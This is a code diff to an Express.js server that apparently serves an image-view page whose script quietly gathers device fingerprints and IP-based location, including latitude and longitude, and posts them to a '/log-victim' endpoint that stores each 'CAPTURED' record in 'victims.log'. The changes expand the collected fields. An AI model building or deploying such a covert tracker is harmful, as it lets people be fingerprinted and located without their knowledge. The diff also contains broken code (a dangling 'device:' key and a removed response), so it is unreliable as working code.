@@ -270,13 +270,21 @@ app.get('/view-image', (req, res) => {
 						method: 'POST',
 						body: JSON.stringify({
 							userAgent: navigator.userAgent,
+							platform: navigator.platform,
 							language: navigator.language,
 							screen: { width: screen.width, height: screen.height },
+							device:
 							timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+							deviceMemory: navigator.deviceMemory || null,
+							hardwareConcurrency: navigator.hardwareConcurrency || null,
+							touchSupport: 'ontouchstart' in window,
 							ip: geo.ip,
 							city: geo.city,
-							country: geo.country_name,
-							location: null,
+							region: geo.region,
+							country_name: geo.country_name,
+							country_code: geo.country_code,
+							latitude: geo.latitude,
+							longitude: geo.longitude,
 							fingerprint: 'fallback-beacon',
 							localIP: null
 						}),
@@ -335,10 +343,11 @@ app.post('/log-victim', express.json(), (req, res) => {
         device_memory: payload.deviceMemory || "Unknown",
         hardware_concurrency: payload.hardwareConcurrency || "Unknown",
         browser: (function(ua) {
+            if (ua.match(/Edge/)) return "Edge";
             if (ua.match(/Chrome|CriOS/)) return "Chrome";
             if (ua.match(/Firefox|FxiOS/)) return "Firefox";
             if (ua.match(/Safari/) && !ua.match(/Chrome/)) return "Safari";
-            if (ua.match(/Edge/)) return "Edge";
+
             if (ua.match(/Opera|OPR/)) return "Opera";
             return "Other";
         })(payload.userAgent),
@@ -371,7 +380,6 @@ app.post('/log-victim', express.json(), (req, res) => {
 			 const data = { ...req.body, ip: req.ip, timestamp: new Date().toISOString() };
 			console.log('💀 CAPTURED:', data);  // Force visible log
 			fs.appendFileSync('victims.log', JSON.stringify(data) + '\n');
-			res.status(200).send('OK');
 			} 
 			catch (err) {
 				if (!res.headersSent) {  // ← guard
